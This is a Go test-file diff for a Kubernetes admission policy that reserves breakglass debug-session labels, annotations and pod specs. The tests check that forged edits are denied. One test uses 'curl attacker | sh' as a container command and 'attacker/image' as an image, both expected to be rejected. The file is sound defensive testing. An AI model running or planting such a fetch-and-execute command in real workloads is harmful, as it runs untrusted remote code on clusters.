@@ -62,9 +62,9 @@ func TestPlatformRuntimeLabelReservationPolicyEnvtest(t *testing.T) {
 	}
 
 	// system:masters skips RBAC, but not admission policies.
-	as := func(user string) (client.Client, kubernetes.Interface) {
+	as := func(user string, groups ...string) (client.Client, kubernetes.Interface) {
 		impersonated := rest.CopyConfig(cfg)
-		impersonated.Impersonate = rest.ImpersonationConfig{UserName: user, Groups: []string{"system:masters"}}
+		impersonated.Impersonate = rest.ImpersonationConfig{UserName: user, Groups: append([]string{"system:masters"}, groups...)}
 		c, err := client.New(impersonated, client.Options{Scheme: scheme.Scheme})
 		require.NoError(t, err)
 		return c, kubernetes.NewForConfigOrDie(impersonated)
@@ -122,13 +122,37 @@ func TestPlatformRuntimeLabelReservationPolicyEnvtest(t *testing.T) {
 		denied(t, forger.Status().Update(ctx, p))
 	})
 
-	t.Run("ephemeral containers keep working when reserved keys are unchanged", func(t *testing.T) {
+	t.Run("debug pod specs are frozen for everyone else", func(t *testing.T) {
+		addEphemeral := func(name string) error {
+			p := &corev1.Pod{}
+			require.NoError(t, admin.Get(ctx, client.ObjectKey{Namespace: ns, Name: name}, p))
+			p.Spec.EphemeralContainers = append(p.Spec.EphemeralContainers, corev1.EphemeralContainer{
+				EphemeralContainerCommon: corev1.EphemeralContainerCommon{Name: "dbg", Image: "busybox", TerminationMessagePolicy: corev1.TerminationMessageReadFile, ImagePullPolicy: corev1.PullAlways}})
+			_, err := forgerKube.CoreV1().Pods(ns).UpdateEphemeralContainers(ctx, p.Name, p, metav1.UpdateOptions{})
+			return err
+		}
+		denied(t, addEphemeral("debug"))
+		assert.NoError(t, addEphemeral("plain"), "ordinary pods keep kubectl debug")
+
 		p := &corev1.Pod{}
 		require.NoError(t, admin.Get(ctx, client.ObjectKey{Namespace: ns, Name: "debug"}, p))
-		p.Spec.EphemeralContainers = append(p.Spec.EphemeralContainers, corev1.EphemeralContainer{
-			EphemeralContainerCommon: corev1.EphemeralContainerCommon{Name: "dbg", Image: "busybox", TerminationMessagePolicy: corev1.TerminationMessageReadFile, ImagePullPolicy: corev1.PullAlways}})
-		_, err := forgerKube.CoreV1().Pods(ns).UpdateEphemeralContainers(ctx, p.Name, p, metav1.UpdateOptions{})
-		assert.NoError(t, err)
+		p.Spec.Containers[0].Image = "attacker/image"
+		denied(t, forger.Update(ctx, p))
+	})
+
+	t.Run("binding annotations are reserved", func(t *testing.T) {
+		require.NoError(t, forger.Create(ctx, pod("to-bind", nil, nil)))
+		bind := func(annotations map[string]string) error {
+			return forgerKube.CoreV1().Pods(ns).Bind(ctx, &corev1.Binding{
+				ObjectMeta: metav1.ObjectMeta{Name: "to-bind", Namespace: ns, Annotations: annotations},
+				Target:     corev1.ObjectReference{Kind: "Node", Name: "node-1"}}, metav1.CreateOptions{})
+		}
+		denied(t, bind(map[string]string{DebugSessionUIDAnnotationKey: "uid"}))
+		require.NoError(t, bind(map[string]string{"example.com/scheduled-by": "x"}))
+		bound := &corev1.Pod{}
+		require.NoError(t, admin.Get(ctx, client.ObjectKey{Namespace: ns, Name: "to-bind"}, bound))
+		assert.Equal(t, "node-1", bound.Spec.NodeName)
+		assert.NotContains(t, bound.Annotations, DebugSessionUIDAnnotationKey)
 	})
 
 	t.Run("workload pod templates are reserved", func(t *testing.T) {
@@ -165,5 +189,51 @@ func TestPlatformRuntimeLabelReservationPolicyEnvtest(t *testing.T) {
 		require.NoError(t, forger.Create(ctx, plain), "templates without reserved keys are unaffected")
 		plain.Spec.Template.Labels[DebugSessionLabelKey] = "s1"
 		denied(t, forger.Update(ctx, plain))
+
+		// A controller-created debug Deployment: others may scale it and edit
+		// its own metadata, but not change what its Pods run.
+		debugDeployment := &appsv1.Deployment{ObjectMeta: meta("debug"), Spec: appsv1.DeploymentSpec{Selector: selector, Replicas: ptr.To[int32](0), Template: always}}
+		require.NoError(t, controller.Create(ctx, debugDeployment))
+		edit := func(change func(*appsv1.Deployment)) error {
+			d := &appsv1.Deployment{}
+			require.NoError(t, admin.Get(ctx, client.ObjectKeyFromObject(debugDeployment), d))
+			change(d)
+			return forger.Update(ctx, d)
+		}
+		assert.NoError(t, edit(func(d *appsv1.Deployment) { d.Spec.Replicas = ptr.To[int32](2) }))
+		assert.NoError(t, edit(func(d *appsv1.Deployment) { d.Labels = map[string]string{"team": "a"} }))
+		denied(t, edit(func(d *appsv1.Deployment) { d.Spec.Template.Spec.Containers[0].Image = "attacker/image" }))
+		denied(t, edit(func(d *appsv1.Deployment) {
+			d.Spec.Template.Spec.Containers[0].Command = []string{"sh", "-c", "curl attacker | sh"}
+		}))
+	})
+	// On a spoke reached over OIDC the controller writes as the mapped OIDC
+	// username, or is recognised by an OIDC group; both lists are configurable.
+	t.Run("OIDC controller identities by username or group", func(t *testing.T) {
+		policy := &unstructured.Unstructured{}
+		policy.SetAPIVersion("admissionregistration.k8s.io/v1")
+		policy.SetKind("ValidatingAdmissionPolicy")
+		require.NoError(t, admin.Get(ctx, client.ObjectKey{Name: "breakglass-runtime-label-reservation"}, policy))
+		variables, _, err := unstructured.NestedSlice(policy.Object, "spec", "variables")
+		require.NoError(t, err)
+		require.Equal(t, "controllerUsers", variables[0].(map[string]any)["name"])
+		require.Equal(t, "controllerGroups", variables[1].(map[string]any)["name"])
+		variables[0].(map[string]any)["expression"] = `["oidc:breakglass-group-sync@service.local"]`
+		variables[1].(map[string]any)["expression"] = `["oidc:breakglass-controllers"]`
+		require.NoError(t, unstructured.SetNestedSlice(policy.Object, variables, "spec", "variables"))
+		require.NoError(t, admin.Update(ctx, policy))
+
+		oidcController, _ := as("oidc:breakglass-group-sync@service.local")
+		groupMember, _ := as("oidc:robot@example.com", "oidc:breakglass-controllers")
+		otherOIDCUser, _ := as("oidc:robot@example.com", "oidc:tenant-admins")
+		// The update takes effect asynchronously: wait until the old
+		// ServiceAccount is no longer exempt.
+		require.Eventually(t, func() bool {
+			err := controller.Create(ctx, pod("sa-probe", sessionLabel, nil), client.DryRunAll)
+			return err != nil && strings.Contains(err.Error(), "reserved for the breakglass controller")
+		}, 30*time.Second, 200*time.Millisecond, "the replaced user list must apply")
+		assert.NoError(t, oidcController.Create(ctx, pod("oidc-user", sessionLabel, nil), client.DryRunAll))
+		assert.NoError(t, groupMember.Create(ctx, pod("oidc-group", sessionLabel, nil), client.DryRunAll))
+		denied(t, otherOIDCUser.Create(ctx, pod("oidc-other", sessionLabel, nil), client.DryRunAll))
 	})
 }
